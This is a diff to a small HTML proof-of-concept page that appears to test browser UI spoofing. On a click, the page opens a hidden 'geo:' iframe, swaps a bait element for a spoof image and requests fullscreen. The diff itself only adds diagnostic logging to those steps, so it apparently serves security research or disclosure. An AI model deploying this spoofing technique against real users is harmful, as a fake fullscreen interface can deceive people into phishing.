@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
     />
-    <title>tester</title>
+    <title>tester-diag</title>
     <style>
       html,
       body {
@@ -63,16 +63,48 @@
       const bait = document.getElementById("bait");
       const spoof = document.getElementById("spoof");
 
+      const logEvent = (label, extra = "") => {
+        const ts = performance.now().toFixed(2);
+        console.info(`[PoC +${ts}ms] ${label}`, extra);
+      };
+
+      spoof.addEventListener("load", () => {
+        logEvent("spoof image loaded", `${spoof.naturalWidth}x${spoof.naturalHeight}`);
+      });
+
+      spoof.addEventListener("error", () => {
+        logEvent("spoof image failed to load");
+      });
+
+      document.addEventListener("fullscreenchange", () => {
+        logEvent("fullscreenchange", `activeElement=${document.fullscreenElement?.id || "none"}`);
+      });
+
+      document.addEventListener("fullscreenerror", (err) => {
+        logEvent("fullscreenerror", err?.type || "unknown");
+      });
+
       btn.addEventListener("click", () => {
+        logEvent("click received");
+
         const geoFrame = document.createElement("iframe");
         geoFrame.style.display = "none";
         geoFrame.src = "geo:0,0?q=apple.com";
         document.body.appendChild(geoFrame);
+        logEvent("geo iframe appended", geoFrame.src);
 
         bait.style.display = "none";
         spoof.style.display = "block";
+        logEvent("dom visibility toggled");
 
-        document.documentElement.requestFullscreen().catch(() => {});
+        if (document.documentElement.requestFullscreen) {
+          document.documentElement
+            .requestFullscreen()
+            .then(() => logEvent("requestFullscreen resolved"))
+            .catch((err) => logEvent("requestFullscreen rejected", err?.message || String(err)));
+        } else {
+          logEvent("requestFullscreen unsupported");
+        }
       });
     </script>
   </body>
